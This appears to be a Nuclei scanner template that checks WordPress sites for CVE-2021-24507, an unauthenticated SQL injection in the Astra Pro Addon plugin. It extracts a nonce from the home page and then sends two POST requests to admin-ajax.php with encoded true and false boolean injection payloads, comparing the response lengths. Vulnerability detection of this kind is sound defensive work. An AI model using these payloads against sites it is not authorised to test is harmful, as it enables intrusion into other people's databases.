id: CVE-2021-24507
info:
  name: Astra Pro Addon < 3.5.2 - Unauthenticated SQL Injection
  author: princechaddha,cognnn
  severity: critical
  description: The Astra Pro Addon WordPress plugin before 3.5.2 did not properly sanitise or escape some of the POST parameters from the astra_pagination_infinite and astra_shop_pagination_infinite AJAX action (available to both unauthenticated and authenticated user) before using them in SQL statement, leading to an SQL Injection issues
  reference:
    - https://wpscan.com/vulnerability/a1a0dc0b-c351-4d46-ac9b-b297ce4d251c
    - https://nvd.nist.gov/vuln/detail/CVE-2021-24507
  tags: cve,cve2021,sqli,wordpress,wp-plugin,wp,unauth,astra-pro

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=astra_shop_pagination_infinite&nonce={{nonce}}&query_vars=%7B%22tax_query%22%3A%7B%220%22%3A%7B%22field%22%3A%22term_taxonomy_id%22%2C%22terms%22%3A%5B%229656%29%29+and+%28%287556%3D1223%22%5D%7D%7D%7D&astra_infinite=astra_pagination_ajax&page_no=1

      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=astra_shop_pagination_infinite&nonce={{nonce}}&query_vars=%7B%22tax_query%22%3A%7B%220%22%3A%7B%22field%22%3A%22term_taxonomy_id%22%2C%22terms%22%3A%5B%229634%29%29+or+%28%286532%3D6532%22%5D%7D%7D%7D&astra_infinite=astra_pagination_ajax&page_no=1

    redirects: true
    max-redirects: 2
    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "len(body_2)==0 && len(body_3)>len(body_2)"

    extractors:
      - type: regex
        part: body
        name: nonce
        internal: true
        group: 1
        regex:
          - 'infinite_nonce":"(.+?)",'
